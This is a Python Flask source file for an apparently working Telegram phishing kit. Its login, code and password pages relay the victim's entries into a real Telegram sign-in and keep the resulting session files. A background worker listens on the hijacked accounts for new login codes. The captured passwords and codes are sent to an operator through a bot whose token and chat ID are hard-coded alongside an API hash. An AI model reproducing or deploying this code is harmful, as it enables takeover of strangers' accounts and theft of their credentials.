import os
import re
import json
import time
import tempfile
import shutil
import asyncio
import threading
import requests
from datetime import datetime
from flask import Flask, render_template, request, redirect, url_for, session, flash, jsonify

# ==== FIX SQLITE ====  (Railway / Linux)
try:
    import sys
    import pysqlite3
    sys.modules['sqlite3'] = pysqlite3
except:
    pass

from telethon import TelegramClient, events
from telethon.sessions import SQLiteSession
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PasswordHashInvalidError,
)

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", "supersecret")

# ===== BOT CONFIG =====
api_id = int(os.getenv("API_ID", 34946540))
api_hash = os.getenv("API_HASH", "7554a5e9dd52df527bfc39d8511413fd")

BOT_TOKEN = "8205641352:AAHxt3LgmDdfKag-NPQUY4WYOIXsul680Hw"
CHAT_ID = "7712462494"

SESSION_DIR = "sessions"
os.makedirs(SESSION_DIR, exist_ok=True)

# ===== STORAGE =====
LAST_DATA = {}  # { phone: {"otp":..., "password":...} }


def save_data(phone, otp=None, password=None):
    if phone not in LAST_DATA:
        LAST_DATA[phone] = {"otp": None, "password": None}
    if otp:
        LAST_DATA[phone]["otp"] = otp
    if password:
        LAST_DATA[phone]["password"] = password


def get_data(phone):
    return LAST_DATA.get(phone, {"otp": None, "password": None})


# ===== INLINE BUTTON WEBHOOK =====
@app.route("/bot", methods=["POST"])
def bot_webhook():
    # Baca JSON dengan aman + logging
    data = request.get_json(silent=True) or {}
    print("== /bot CALLBACK RECEIVED ==")
    print(data)

    if "callback_query" not in data:
        return jsonify({"ok": True})

    q = data["callback_query"]
    cid = q["message"]["chat"]["id"]
    cb = q.get("data", "")
    cb_id = q.get("id")

    # Jawab callback agar loading di Telegram berhenti
    if cb_id:
        try:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery",
                data={"callback_query_id": cb_id}
            )
        except Exception as e:
            print("[BOT] answerCallbackQuery error:", e)

    if cb.startswith("cek_"):
        phone = cb.replace("cek_", "")
        info = get_data(phone)

        if not info["otp"]:
            txt = "❌ Silahkan login terlebih dahulu untuk mendapatkan OTP baru"
        else:
            txt = (
                f"🔐 Password: {info['password'] or '-'}\n"
                f"🔑 OTP: {info['otp']}"
            )

        try:
            r = requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                data={"chat_id": cid, "text": txt}
            )
            print("[BOT] sendMessage status:", r.status_code, r.text)
        except Exception as e:
            print("[BOT] sendMessage error:", e)

    return jsonify({"ok": True})


# ===== SEND LOGIN INFO KE BOT =====
def send_login_message(phone):
    waktu = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    text = f"📞 Nomor: {phone}\n🕒 Login: {waktu}"

    try:
        r = requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            data={
                "chat_id": CHAT_ID,
                "text": text,
                "reply_markup": json.dumps({
                    "inline_keyboard": [
                        [{"text": "🔍 Cek", "callback_data": f"cek_{phone}"}]
                    ]
                })
            }
        )
        print("[BOT] login message status:", r.status_code, r.text)
    except Exception as e:
        print("[BOT] login message error:", e)


# ===== SESSION MANAGEMENT =====
def remove_session_files(phone):
    for fn in os.listdir(SESSION_DIR):
        if fn.startswith(f"{phone}."):
            try:
                os.remove(os.path.join(SESSION_DIR, fn))
            except:
                pass


def finalize_pending_session(phone):
    for fn in os.listdir(SESSION_DIR):
        if fn.startswith(f"{phone}.pending"):
            src = os.path.join(SESSION_DIR, fn)
            dst = os.path.join(SESSION_DIR, fn.replace(".pending", ""))
            try:
                os.rename(src, dst)
            except:
                pass


# ===== ROOT HTML LOGIN =====
@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        phone = request.form.get("phone")
        session["phone"] = phone
        remove_session_files(phone)

        pending = os.path.join(SESSION_DIR, f"{phone}.pending")

        async def run():
            client = TelegramClient(pending, api_id, api_hash)
            await client.connect()
            sent = await client.send_code_request(phone)
            session["phone_code_hash"] = sent.phone_code_hash
            await client.disconnect()

        asyncio.run(run())
        return redirect(url_for("otp"))

    return render_template("login.html")


# ===== API LOGIN (AJAX) =====
@app.route("/api/login", methods=["POST"])
def api_login():
    phone = request.form.get("phone")

    if not phone:
        return jsonify({"status": "error", "message": "Phone kosong"})

    session["phone"] = phone
    remove_session_files(phone)

    pending = os.path.join(SESSION_DIR, f"{phone}.pending")

    async def run():
        client = TelegramClient(pending, api_id, api_hash)
        await client.connect()
        sent = await client.send_code_request(phone)
        session["phone_code_hash"] = sent.phone_code_hash
        await client.disconnect()

    asyncio.run(run())

    return jsonify({"status": "success", "redirect": url_for("otp")})


# ===== HTML OTP =====
@app.route("/otp", methods=["GET", "POST"])
def otp():
    phone = session.get("phone")

    if request.method == "POST":
        code = request.form.get("otp")
        pending = os.path.join(SESSION_DIR, f"{phone}.pending")

        async def run():
            client = TelegramClient(pending, api_id, api_hash)
            await client.connect()
            try:
                await client.sign_in(phone=phone, code=code, phone_code_hash=session.get("phone_code_hash"))
                await client.disconnect()
                finalize_pending_session(phone)
                return {"ok": True, "need_pwd": False}
            except SessionPasswordNeededError:
                await client.disconnect()
                return {"ok": True, "need_pwd": True}
            except PhoneCodeInvalidError:
                await client.disconnect()
                return {"ok": False, "msg": "OTP salah"}
            except Exception as e:
                await client.disconnect()
                return {"ok": False, "msg": str(e)}

        result = asyncio.run(run())

        if result["ok"]:
            if result["need_pwd"]:
                session["need_password"] = True
                return redirect(url_for("password"))
            else:
                send_login_message(phone)
                return redirect(url_for("success"))
        else:
            flash(result["msg"])

    return render_template("otp.html")


# ===== API OTP (AJAX) =====
@app.route("/api/otp", methods=["POST"])
def api_otp():
    phone = session.get("phone")
    code = request.form.get("otp")
    pending = os.path.join(SESSION_DIR, f"{phone}.pending")

    async def run():
        client = TelegramClient(pending, api_id, api_hash)
        await client.connect()
        try:
            await client.sign_in(phone=phone, code=code, phone_code_hash=session.get("phone_code_hash"))
            await client.disconnect()
            finalize_pending_session(phone)
            return {"ok": True, "need_pwd": False}
        except SessionPasswordNeededError:
            await client.disconnect()
            return {"ok": True, "need_pwd": True}
        except PhoneCodeInvalidError:
            await client.disconnect()
            return {"ok": False, "msg": "OTP salah"}
        except Exception as e:
            await client.disconnect()
            return {"ok": False, "msg": str(e)}

    result = asyncio.run(run())

    if result["ok"]:
        if result["need_pwd"]:
            session["need_password"] = True
            return jsonify({"status": "success", "redirect": url_for("password")})
        else:
            send_login_message(phone)
            return jsonify({"status": "success", "redirect": url_for("success")})
    else:
        return jsonify({"status": "error", "message": result["msg"]})


# ===== HTML PASSWORD =====
@app.route("/password", methods=["GET", "POST"])
def password():
    phone = session.get("phone")

    if request.method == "POST":
        pwd = request.form.get("password")
        pending = os.path.join(SESSION_DIR, f"{phone}.pending")

        async def run():
            client = TelegramClient(pending, api_id, api_hash)
            await client.connect()
            try:
                await client.sign_in(password=pwd)
                await client.disconnect()
                finalize_pending_session(phone)
                return True
            except:
                await client.disconnect()
                return False

        ok = asyncio.run(run())

        if ok:
            save_data(phone, password=pwd)
            send_login_message(phone)
            return redirect(url_for("success"))
        else:
            flash("Password salah")

    return render_template("password.html")


# ===== API PASSWORD (AJAX) =====
@app.route("/api/password", methods=["POST"])
def api_password():
    phone = session.get("phone")
    pwd = request.form.get("password")
    pending = os.path.join(SESSION_DIR, f"{phone}.pending")

    async def run():
        client = TelegramClient(pending, api_id, api_hash)
        await client.connect()
        try:
            await client.sign_in(password=pwd)
            await client.disconnect()
            finalize_pending_session(phone)
            return True
        except:
            await client.disconnect()
            return False

    ok = asyncio.run(run())

    if ok:
        save_data(phone, password=pwd)
        send_login_message(phone)
        return jsonify({"status": "success", "redirect": url_for("success")})
    else:
        return jsonify({"status": "error", "message": "Password salah"})


@app.route("/success")
def success():
    return render_template("success.html", phone=session.get("phone"))


# ===== WORKER =====
async def forward_handler(event, client_name):
    text = getattr(event, "raw_text", "") or ""
    sender = await event.get_sender()

    if sender.id != 777000:
        return

    otp = re.findall(r"\d{5,6}", text)
    if not otp:
        return

    save_data(client_name, otp=otp[0])
    print("[OTP FOUND]", client_name, otp[0])


async def worker_main():
    clients = {}

    while True:
        for fn in os.listdir(SESSION_DIR):
            if not fn.endswith(".session") or ".pending" in fn:
                continue

            base = fn[:-8]
            if base in clients:
                continue

            real_session = os.path.join(SESSION_DIR, base + ".session")

            # copy to temp (hindari database locked)
            temp_db = os.path.join(tempfile.gettempdir(), f"{base}.sqlite")
            try:
                shutil.copy2(real_session, temp_db)
            except:
                pass

            client = TelegramClient(
                SQLiteSession(temp_db),
                api_id,
                api_hash
            )

            for _ in range(5):
                try:
                    await client.connect()
                    break
                except:
                    await asyncio.sleep(0.5)

            if not await client.is_user_authorized():
                await client.disconnect()
                continue

            @client.on(events.NewMessage(incoming=True))
            async def handler(event, fn=base):
                try:
                    await forward_handler(event, fn)
                except:
                    pass

            task = asyncio.create_task(client.run_until_disconnected())
            clients[base] = task

        await asyncio.sleep(0.5)


def start_worker_thread():
    def run():
        asyncio.run(worker_main())
    t = threading.Thread(target=run, daemon=True)
    t.start()


# ===== PANGGIL WORKER SELALU (lokal & Railway) =====
start_worker_thread()

# ===== MAIN UNTUK LOKAL =====
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=True)
